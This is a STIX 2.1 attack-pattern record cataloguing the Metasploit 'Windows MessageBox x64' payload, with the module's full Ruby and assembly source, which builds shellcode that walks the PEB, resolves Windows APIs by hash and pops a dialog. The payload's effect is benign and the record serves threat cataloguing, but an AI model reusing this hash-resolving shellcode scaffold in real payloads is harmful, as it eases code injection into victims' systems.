{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4c98d6ef-8aff-4cfb-97f7-fd1e5f163a7d",
    "created": "2024-08-14T16:33:19.381796Z",
    "modified": "2024-08-14T16:33:19.381799Z",
    "name": "Windows MessageBox x64",
    "description": "Spawn a dialog via MessageBox using a customizable title, text & icon",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/x64/messagebox.rb",
            "external_id": "messagebox.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 322\n\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'Windows MessageBox x64',\n      'Description' => 'Spawn a dialog via MessageBox using a customizable title, text & icon',\n      'Author'      => [\n        'pasta <jaguinaga[at]infobytesec.com>'\n      ],\n      'License'     => GPL_LICENSE,\n      'Platform'    => 'win',\n      'Arch'        => ARCH_X64\n    ))\n\n    icon_opts = ['NO', 'ERROR', 'INFORMATION', 'WARNING', 'QUESTION']\n    register_options(\n      [\n        OptString.new('TITLE', [true, \"Messagebox Title\", \"MessageBox\"]),\n        OptString.new('TEXT', [true, \"Messagebox Text\", \"Hello, from MSF!\"]),\n        OptEnum.new('ICON', [true, \"Icon type\", icon_opts[0], icon_opts])\n      ]\n    )\n  end\n\n  def ror(dword, arg, bits = 32)\n    mask = (2**arg) - 1\n    mask_bits = dword & mask\n    return (dword >> arg) | (mask_bits << (bits - arg))\n  end\n\n  def rol(dword, arg, bits = 32)\n    return ror(dword, bits - arg, bits)\n  end\n\n  def hash(msg)\n    hash = 0\n    msg.each_byte do |c|\n      hash = ror(c.ord + hash, 0xd)\n    end\n    return hash\n  end\n\n  def to_unicode(msg)\n    return msg.encode(\"binary\").split('').join(\"\\x00\") + \"\\x00\\x00\"\n  end\n\n  def api_hash(libname, function)\n    return (hash(to_unicode(libname.upcase)) + hash(function)) & 0xffffffff\n  end\n\n  def generate(_opts = {})\n    style = 0x00\n    case datastore['ICON'].upcase.strip\n      # default = NO\n    when 'ERROR'\n      style = 0x10\n    when 'QUESTION'\n      style = 0x20\n    when 'WARNING'\n      style = 0x30\n    when 'INFORMATION'\n      style = 0x40\n    end\n\n    if datastore['EXITFUNC'].upcase.strip == 'PROCESS'\n      exitfunc_asm = %(\n        xor rcx,rcx\n        mov r10d, #{api_hash('kernel32.dll', 'ExitProcess')}\n        call rbp\n      )\n    elsif datastore['EXITFUNC'].upcase.strip == 'THREAD'\n      exitfunc_asm = %(\n        mov ebx, #{api_hash('kernel32.dll', 'ExitThread')}\n        mov r10d, #{api_hash('kernel32.dll', 'GetVersion')}\n        call rbp\n        add rsp,0x28\n        cmp al,0x6\n        jl use_exitthread   ; is older than Vista or Server 2003 R2?\n        cmp bl,0xe0         ; check if GetVersion change the hash stored in EBX\n        jne use_exitthread\n        mov ebx, #{api_hash('ntdll.dll', 'RtlExitUserThread')}\n\n        use_exitthread:\n        push 0\n        pop rcx\n        mov r10d,ebx\n        call rbp\n      )\n    end\n    exitfunc = Metasm::Shellcode.assemble(Metasm::X64.new, exitfunc_asm).encode_string\n\n    payload_asm = %(\n      cld\n      and rsp,0xfffffffffffffff0\n      call start_main\n      push r9\n      push r8\n      push rdx\n      push rcx\n      push rsi\n      xor rdx,rdx\n      mov rdx,qword ptr gs:[rdx+0x60]\n      mov rdx,qword ptr ds:[rdx+0x18]\n      mov rdx,qword ptr ds:[rdx+0x20]\n      next_mod:\n      mov rsi,qword ptr ds:[rdx+0x50]\n      movzx rcx,word ptr ds:[rdx+0x4a]\n      xor r9,r9\n      loop_modname:\n      xor rax,rax\n      lodsb\n      cmp al,0x61\n      jl not_lowercase\n      sub al,0x20\n      not_lowercase:\n      ror r9d,0xd\n      add r9d,eax\n      loop loop_modname\n      push rdx\n      push r9\n      mov rdx,qword ptr ds:[rdx+0x20]\n      mov eax,dword ptr ds:[rdx+0x3c]\n      add rax,rdx\n      mov eax,dword ptr ds:[rax+0x88]\n      test rax,rax\n      je get_next_mod1\n      add rax,rdx\n      push rax\n      mov ecx,dword ptr ds:[rax+0x18]\n      mov r8d,dword ptr ds:[rax+0x20]\n      add r8,rdx\n      check_has:\n      jrcxz get_next_mod\n      dec rcx\n      mov esi,dword ptr ds:[r8+rcx*4]\n      add rsi,rdx\n      xor r9,r9\n      loop_funcname:\n      xor rax,rax\n      lodsb\n      ror r9d,0xd\n      add r9d,eax\n      cmp al,ah\n      jne loop_funcname\n      add r9,qword ptr ds:[rsp+0x8]\n      cmp r9d,r10d\n      jne check_has\n      pop rax\n      mov r8d,dword ptr ds:[rax+0x24]\n      add r8,rdx\n      mov cx,word ptr ds:[r8+rcx*2]\n      mov r8d,dword ptr ds:[rax+0x1c]\n      add r8,rdx\n      mov eax,dword ptr ds:[r8+rcx*4]\n      add rax,rdx\n      pop r8\n      pop r8\n      pop rsi\n      pop rcx\n      pop rdx\n      pop r8\n      pop r9\n      pop r10\n      sub rsp,0x20\n      push r10\n      jmp rax\n      get_next_mod:\n      pop rax\n      get_next_mod1:\n      pop r9\n      pop rdx\n      mov rdx,qword ptr ds:[rdx]\n      jmp next_mod\n      start_main:\n      pop rbp\n      lea rcx,qword ptr ds:[rbp + #{exitfunc.length + datastore['TEXT'].length + datastore['TITLE'].length + 0x105}]\n      mov r10d, #{api_hash('kernel32.dll', 'LoadLibraryA')}\n      call rbp\n      mov r9, #{style}\n      lea rdx,qword ptr ds:[rbp + #{exitfunc.length + 0x103}]\n      lea r8,qword ptr ds:[rbp + #{exitfunc.length + datastore['TEXT'].length + 0x104}]\n      xor rcx,rcx\n      mov r10d, #{api_hash('user32.dll', 'MessageBoxA')}\n      call rbp\n    )\n\n    payload_data = Metasm::Shellcode.assemble(Metasm::X64.new, payload_asm).encode_string\n    payload_data << exitfunc\n    payload_data << datastore['TEXT'] + \"\\x00\"\n    payload_data << datastore['TITLE'] + \"\\x00\"\n    payload_data << \"user32.dll\" + \"\\x00\"\n\n    return payload_data\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}